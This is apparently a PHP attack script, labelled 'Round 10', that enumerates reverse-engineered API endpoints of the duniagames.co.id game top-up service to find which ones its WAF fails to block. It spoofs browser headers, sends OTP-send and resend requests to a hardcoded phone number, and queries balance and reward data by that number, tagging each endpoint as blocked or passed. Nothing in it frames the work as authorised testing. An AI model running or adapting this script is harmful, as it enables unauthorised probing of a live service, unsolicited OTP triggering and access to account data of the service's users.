<?php
// Ronde 10: enumerasi path duniagames — mana yang TIDAK di-blok WAF (dari daftar jalur hasil RE)
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$L = '083822461998'; $N = '83822461998'; $P = '6283822461998';
$B = 'https://api.duniagames.co.id/api/';
$H = ['Content-Type: application/json', 'Accept: application/json, text/plain, */*',
      'Origin: https://duniagames.co.id', 'Referer: https://duniagames.co.id/'];

$PATHS = [
  ['POST user/send-otp',        'user/api/v2/user/send-otp',        '{"email":"coba' . random_int(1000, 9999) . '@gmail.com"}'],
  ['POST user/resend-otp',      'user/api/v2/user/resend-otp',      '{"phoneNumber":"' . $L . '","authId":"1"}'],
  ['POST tx v2 settle req-otp', 'transaction/v2/settlement/v2/req-otp', '{"phoneNumber":"' . $L . '"}'],
  ['POST tx v1 settle req-otp', 'transaction/v1/settlement/v1/req-otp', '{"phoneNumber":"' . $L . '"}'],
  ['POST v2 settle req-otp',    'v2/settlement/v2/req-otp',         '{"phoneNumber":"' . $L . '"}'],
  ['POST v2 settle v1 req-otp', 'v2/settlement/v1/req-otp',         '{"phoneNumber":"' . $L . '"}'],
  ['POST tx v1 topup req-otp',  'transaction/v1/top-up/transaction/req-otp/', '{"phoneNumber":"' . $L . '","inquiryId":"1"}'],
  ['POST realms auth',          'identity/v2/realms/tsel/authenticate', '{}'],
  ['POST sessions',             'identity/v2/sessions',             '{}'],
  ['POST onboarding',           'user/api/v2/profiles/onboarding',  '{}'],
  ['GET  get-msisdn',           'v1/get-msisdn',                    ''],
  ['GET  profile get',          'user/api/v1/profile/get',          ''],
  ['GET  balance',              'history/v1/dg-diamond/get-balance?phoneNumber=' . $L, ''],
  ['GET  program by msisdn',    'v1/list-program-reward-by-msisdn?phoneNumber=' . $L, ''],
  ['GET  user roles',           'user-roles/v1/',                   ''],
  ['GET  store inquiry',        'transaction/v1/top-up/inquiry/store', ''],
  ['POST content article',      'content-article/v1/article',       '{}'],
  ['GET  product catalog',      'product/catalog/v1/product-catalog', ''],
  ['GET  user-consent',         'user-consent/v1/user-consent',     ''],
  ['GET  item browse-offer',    'item-catalog/v2/browse-offer',     ''],
];

foreach ($PATHS as [$label, $path, $body]) {
  $m = $body === '' ? 'GET' : 'POST';
  $ch = curl_init();
  $hdrs = $H; $hdrs[] = 'User-Agent: ' . $UA;
  curl_setopt_array($ch, [CURLOPT_URL => $B . $path, CURLOPT_HTTPHEADER => $hdrs, CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_TIMEOUT => 30, CURLOPT_ENCODING => '', CURLOPT_CUSTOMREQUEST => $m]);
  if ($m === 'POST') curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
  $resp = (string) curl_exec($ch);
  $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  $err = curl_error($ch);
  curl_close($ch);
  $flat = trim(preg_replace('/\s+/', ' ', $resp));
  $blocked = (stripos($flat, 'Just a moment') !== false || stripos($flat, 'Attention Required') !== false);
  $tag = $blocked ? 'BLOKIR' : ($err !== '' ? 'ERR' : 'Lolos');
  $show = $blocked ? 'WAF challenge' : ($err !== '' ? $err : ($flat !== '' ? substr($flat, 0, 130) : '(kosong)'));
  printf("%-6s %-3s %-26s %s\n", $tag, $code ?: '000', $label, $show);
  usleep(300000);
}
echo "\n";
